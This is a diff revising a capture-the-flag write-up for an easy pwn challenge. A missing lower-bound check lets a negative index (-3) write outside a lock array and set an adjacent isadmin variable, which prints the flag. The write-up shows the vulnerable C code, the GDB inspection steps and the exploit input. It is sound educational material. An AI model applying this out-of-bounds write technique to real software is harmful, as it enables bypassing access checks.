@@ -1,39 +1,29 @@
-# COOL AHH LOCK - PWN WRITEUP
+# COOL AHH LOCK
 # Pwn(Easy)
 
-#1
+## Looking at the program
 
-I downloaded the challenge files and opened the terminal in the challenge directory:
+I started by checking the challenge files and running the program:
 
+```bash
 cd ~/Downloads/cool_ahh_lock
-
-I checked the files:
-
 ls -l
-
-The important files were:
-- cool_ahh_lock       -> compiled binary
-- cool_ahh_lock.c     -> C source code
-- flag.txt            -> flag file
-
-I ran the binary:
-
 ./cool_ahh_lock
+```
 
-The program gives us a 4-digit number lock and asks which position we want to change.
+The program asks me to set numbers in a four-digit lock. I looked at the source code to understand how it worked.
 
-#2
+The important variables were:
 
-The source contains:
-
+```c
 int isadmin = 0;
 int lock[4] = {0, 0, 0, 0};
 int password[4] = {0, 0, 0, 0};
+```
 
-The password is randomly generated, so we don't know the correct 4 digits.
+The password is generated randomly, so guessing it would be difficult. But I noticed that the program lets the user choose which position in `lock` to change:
 
-The program checks the user's chosen position using:
-
+```c
 scanf("%d", &idx);
 
 if (idx > 4) {
@@ -42,176 +32,83 @@ if (idx > 4) {
 }
 
 scanf("%d", &lock[idx - 1]);
+```
 
-Normally:
+The program checks that `idx` is not greater than 4, but it never checks that `idx` is at least 1. That means a negative index can access memory outside the `lock` array.
 
-idx = 1  -> lock[0]
-idx = 2  -> lock[1]
-idx = 3  -> lock[2]
-idx = 4  -> lock[3]
+## Finding what to overwrite
 
-However, the program only checks whether idx is greater than 4.
+The program only opens the secret chamber when `isadmin` is non-zero:
 
-It does NOT check whether idx is less than 1.
-
-Therefore, negative values are accepted.
-
-For example:
-
-idx = -3
-
-Then:
-
-idx - 1 = -4
-
-So the program accesses:
-
-lock[-4]
-
-This is outside the lock array and is therefore an OUT-OF-BOUNDS WRITE.
-
-#3 
-
-The program also contains:
-
-int isadmin = 0;
-
-Later it checks:
-
+```c
 if (isadmin) {
     theSecretChamber();
 }
+```
 
-The secret function is:
+That function reads the flag:
 
+```c
 void theSecretChamber() {
     system("cat flag.txt");
 }
+```
 
-Therefore, instead of trying to guess the random password, we can try to modify isadmin.
+So I wanted to use the out-of-bounds write to change `isadmin` from `0` to `1`.
 
-The goal becomes:
+I compiled the source with debugging information and used GDB to check where `isadmin` and `lock` were in memory:
 
-Out-of-bounds write
-        ↓
-Modify isadmin
-        ↓
-isadmin becomes non-zero
-        ↓
-theSecretChamber()
-        ↓
-cat flag.txt
-        ↓
-FLAG
-
-#4 Using Gdb
-I opened the binary with GDB:
-
-gdb ./cool_ahh_lock
-
-GDB is the GNU Debugger. It allows us to inspect the program and its memory.
-
-Since the original binary did not provide the debugging symbols needed to directly inspect variables, I compiled the provided C source with debugging information:
-
+```bash
 gcc -g -O0 cool_ahh_lock.c -o cool_ahh_lock_debug
-
-Then:
-
 gdb ./cool_ahh_lock_debug
+```
 
-Inside GDB, I checked the memory addresses of the important variables:
+Inside GDB, I ran:
 
+```gdb
 p &isadmin
-
 p &lock
+```
 
-This allowed me to determine the relative position of isadmin and the lock array in memory.
+The memory layout showed that choosing index `-3` makes the program write to `lock[-4]`, which reaches `isadmin` in this build.
 
-#5 exploit
+## Exploit
 
-The required negative index was:
+When the program asked which position to change, I entered `-3`. Then I entered `1` as the value to write. Finally, I entered `n` when asked whether to continue:
 
--3
-
-The program then asks for the value to write.
-
-I entered:
-
-1
-
-Then:
-
-n
-
-So the final input was:
-
+```text
 -3
 1
 n
+```
 
-The calculation is:
+The program calculates the array position as `idx - 1`, so `-3` becomes `-4`. This causes the write `lock[-4] = 1`, changing `isadmin` to a non-zero value. The program then opens the secret chamber and prints the flag.
 
-idx = -3
-idx - 1 = -4
+## Commands used
 
-Therefore the program performs:
-
-lock[-4] = 1
-
-Because lock[-4] is outside the array, this out-of-bounds write reaches the memory location of isadmin.
-
-This changes:
-
-isadmin = 0
-
-to:
-
-isadmin = 1
-
-The program then executes:
-
-theSecretChamber();
-
-which runs:
-
-system("cat flag.txt");
-
-and displays the flag.
-
-#6 Commands used:
-
+```bash
 cd ~/Downloads/cool_ahh_lock
 ls -l
 ./cool_ahh_lock
-gdb ./cool_ahh_lock
 gcc -g -O0 cool_ahh_lock.c -o cool_ahh_lock_debug
 gdb ./cool_ahh_lock_debug
+```
 
-Inside GDB:
+Commands entered inside GDB:
 
+```gdb
 p &isadmin
 p &lock
+```
 
-#7 Final Exploit Input
+## Vulnerability
 
+The bug is an out-of-bounds write caused by incomplete bounds checking. The program rejects indexes greater than 4, but does not reject indexes less than 1. A negative index can therefore write outside the `lock` array and overwrite nearby memory.
+
+## Exploit input
+
+```text
 -3
 1
 n
-
-#8 Vulnerability
-
-The vulnerability is an out-of-bounds array write caused by incomplete bounds checking.
-
-The program checks:
-
-if (idx > 4)
-
-but fails to check:
-
-if (idx < 1)
-
-This allows negative indexes such as -3, which can write to memory outside the lock array and overwrite isadmin.
-
-#9 Attack FLow
-
-The attack flow begins by bypassing the need to guess a random password through source code inspection, which reveals a missing lower-bound check. This allows the use of a negative index, specifically lock[-4], to overwrite the isadmin variable and set it to 1. Finally, this grants access to execute theSecretChamber() and retrieve the flag by reading the flag.txt file.
+```
